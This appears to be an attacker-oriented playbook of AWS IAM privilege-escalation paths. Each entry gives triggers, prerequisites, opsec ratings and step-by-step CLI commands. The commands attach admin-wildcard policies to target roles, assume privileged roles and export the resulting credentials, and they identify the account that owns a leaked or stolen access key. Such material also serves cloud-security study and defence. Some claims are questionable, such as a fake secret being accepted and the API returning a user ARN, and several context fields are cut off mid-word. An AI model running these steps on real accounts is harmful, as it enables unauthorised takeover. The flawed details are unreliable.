# STS - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:CreatePolicyVersion + sts:AssumeRole [added: 2026-04]
- **Tags:** #Iam #Sts #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam + sts accessible
- **Prereq:** IAM perms: iam:CreatePolicyVersion, sts:AssumeRole; A customer-managed policy must exist that is attached to a target role
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-016] This is a variation of `iam:CreatePolicyVersion` (iam-001). This variation is needed when you have `iam:CreatePolicyVersion` permission on a customer-managed policy that is attached to another role (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a policy attached to a different role and then assuming that role. This re
- **Payload/Method:**
```
# Step 1: Verify current identity before privilege escalation
aws sts get-caller-identity

# Step 2: List available roles to find targets with the customer-managed policy attached (optional but helpful for discovery)
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table

# Step 3: Get the target customer-managed policy information to verify it exists and check current version
aws iam get-policy --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY

# Step 4: View the current policy document to understand existing permissions (optional)
aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY --version-id v1

# Step 5: Create a new policy version with administrative permissions and set it as default. The policy immediately takes effect f
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY \
  --policy-document file://admin_policy.json \
  --set-as-default
```

### iam:PutRolePolicy + sts:AssumeRole [added: 2026-04]
- **Tags:** #Iam #Sts #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam + sts accessible
- **Prereq:** IAM perms: iam:PutRolePolicy, sts:AssumeRole; A target role must exist that you have `iam:PutRolePolicy` permission on
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-017] This is a variation of `iam:PutRolePolicy` (iam-005). This variation is needed when you have `iam:PutRolePolicy` permission on another role (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a different role and then assuming it. This requires both `iam:PutRolePolicy` on the target role AND `sts:AssumeRole` permission. Cr
- **Payload/Method:**
```
# Step 1: List all roles to identify targets with trust policies that allow the attacking principal to assume them
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table

# Step 2: Check the trust policy of a specific role to verify the attacking principal can assume it
aws iam get-role --role-name TARGET_ROLE

# Step 3: List current inline policies on the target role to verify existing permissions (optional)
aws iam list-role-policies --role-name TARGET_ROLE

# Step 4: Create an inline policy with administrative permissions and attach it directly to the target role
aws iam put-role-policy \
  --role-name TARGET_ROLE \
  --policy-name AdminInlinePolicy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }
    ]
  }'

# Step 5: Wait for the policy to propagate across AWS infrastructure (typically takes 10-15 seconds)
sleep 15
```

### sts:AssumeRole [added: 2026-04]
- **Tags:** #Sts #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; sts accessible
- **Prereq:** IAM perms: sts:AssumeRole; A role must exist with administrative permissions (e.g., AdministratorAccess)
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [sts-001] A principal with `sts:AssumeRole` permission can assume IAM roles that trust them in their trust policy. We refer to this as two-way trust, or bidirectional trust. Direction 1 is the forward trust - the starting principal that has `sts:AssumeRole` permission on one or more roles. Direction 2 is the reverse trust - the target role must trust the starting principal to assume it. It's important to re
- **Payload/Method:**
```
# Step 1: Verify current identity before privilege escalation
aws sts get-caller-identity

# Step 2: List available roles to find targets with elevated permissions (optional but helpful for discovery)
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table

# Step 3: Check the role's trust policy to confirm the attacker can assume it, and view attached policies (optional)
aws iam get-role --role-name TARGET_ROLE

# Step 4: Assume the privileged role to obtain temporary credentials with elevated permissions
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \
  --role-session-name privesc-session

# Step 5: Configure the AWS CLI to use the assumed role credentials
export AWS_ACCESS_KEY_ID=<AccessKeyId from step 4>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 4>
export AWS_SESSION_TOKEN=<SessionToken from step 4>
```

### AWS Account ID Enumeration via sts:GetAccessKeyInfo [added: 2026-05]
- **Tags:** #AWS #STS #AccountIDEnum #AccessKeyInfo #Recon #IAMRecon #AccountDiscovery #CredentialAnalysis
- **Trigger:** Extracted AWS access key from source code, git history, or environment variable but target AWS account ID is unknown
- **Prereq:** Leaked or stolen AWS access key (format: AKIA* followed by 20 random chars); AWS CLI or SDK configured with the key
- **Yields:** 12-digit AWS account ID owning the access key; enables downstream enumeration (S3 bucket discovery, cross-account assumption, SNS abuse)
- **Opsec:** Low
- **Context:** `sts:GetAccessKeyInfo` is an unauthenticated (no signature required) API endpoint that returns metadata about any AWS access key, including the account ID. This is a direct reconnaissance vector — no credentials needed to enumerate which account owns a key. Useful when credential spray fails or account ID is needed for cross-account attacks.
- **Payload/Method:**
  ```bash
  # Step 1 — Configure AWS CLI with leaked key (no secret needed for GetAccessKeyInfo)
  export AWS_ACCESS_KEY_ID=AKIA...
  export AWS_SECRET_ACCESS_KEY=fake  # any value works; API doesn't validate signature
  
  # Step 2 — Call sts:GetAccessKeyInfo (unauthenticated endpoint)
  aws sts get-access-key-info --access-key-id AKIA... --region us-east-1
  
  # Step 3 — Extract Account field from response (returns account ID and IAM user ARN)
  # Response example: {"AccessKeyInfo": {"AccountId": "123456789012", ...}}
  
  # Step 4 — Use enumerated account ID for downstream attacks
  # - S3 bucket enumeration (bucket naming often includes account ID)
  # - Cross-account role assumption (--role-arn arn:aws:iam::<ACCOUNT_ID>:role/...)
  # - SNS subscription abuse (subscribe to SNS topics in target account)
  
  # Complete example:
  aws sts get-access-key-info --access-key-id AKIA2ASDF1234ABCD5EF --region us-east-1 --output json | jq '.AccessKeyInfo.AccountId'
  # Output: 123456789012
  `````
